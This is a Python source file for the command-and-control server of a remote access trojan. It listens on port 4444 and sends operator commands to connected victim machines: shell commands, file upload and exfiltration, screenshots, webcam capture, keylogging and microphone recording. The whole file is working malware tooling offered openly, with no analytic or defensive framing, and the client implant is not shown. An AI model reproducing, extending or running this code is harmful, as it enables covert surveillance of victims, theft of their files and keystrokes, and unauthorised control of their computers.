import socket
import base64
import time
import keyboard

#create socket for client connection(n9drou ndirou multiple clients !)
def handle_client(client_socket):
	while True:
		try:
			
			command = input("C2> Enter a Command: ")
			client_socket.send(command.encode())
			if command.lower() == 'exit':
				break
			
			if command.startswith('upload '):
				local_path = command.split(' ')[1]
				with open(local_path, 'rb') as f:
					file_data = f.read()
				encoded_data = base64.b64encode(file_data).decode()
				command = f"upload {command.split(' ')[2]}"
				client_socket.send(command.encode())
				client_socket.send(encoded_data.encode())
				output = client_socket.recv(4096).decode()
				print(output)
				continue

			output = client_socket.recv(10000000).decode()
			
			print(output)

			if  command.startswith(('download', 'webcam', 'screenshot', 'getkeylogger', 'getmicrecord')):
				try:
					output = base64.b64decode(output.encode())
				except Exception :
					continue
				if command == 'screenshot':
					filename = f"screenshot{int(time.time())}.png"
				elif command == 'webcam':
					filename = f"webcam{int(time.time())}.png"
				elif command.startswith('mic'):
					filename = f"microphone{int(time.time())}.wav"
				elif command == 'getkeylogger':
					filename = f"keylogg{int(time.time())}.txt"
				elif command == 'getmicrecord':
					filename = f"microphone{int(time.time())}.wav"
				else:
					filename = command[9:]
				try:
					with open(filename, 'wb') as f:
						f.write(output)
					print(f"File {filename} downloaded successfully.")
					continue
				except Exception as e:
					print(f"[-] Failed to save file: {e}")
					continue
			#keylogg wela ymchi !
			if command == 'mic':
				continue
			if command == 'keylogger':
				continue
				
		except Exception as e:
			print(f"An error occurred: {e}")
			break




def start_server():
	serverIP = "0.0.0.0"
	serverPort = 4444

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((serverIP, serverPort))
	s.listen(5)
	print(f"[*] Listening on {serverIP}:{serverPort}")

	while True:
		conn, addr = s.accept()
		print(f"[*] Connection established from {addr[0]}:{addr[1]}")
		print("[*] Waiting for next connection...")
		print("--------------------------------------------------")
		print("C2 Server is Running...")
		print("enter any command to send to the client")
		print("type 'upload <path on server> <path on client>' to upload file to client machine")
		print("type 'download <path>' to download file from client machine")
		print("type 'screenshot' to capture screenshot from client machine")
		print("type 'webcam' to capture webcam image from client machine")
		print("type 'keylogger' to start keylogger on client machine")
		print("type 'getkeylogger' to get keystrokes logged from client machine")
		print("type 'mic' to start recording audio from client machine")
		print("type 'getmicrecord' to get audio recorded from client machine")
		print("type 'exit' to terminate the connection")

		#client_handler = threading.Thread(target=handle_client, args=(conn,))
		#client_handler.start()
		handle_client(conn)


if __name__ == "__main__":
	start_server()
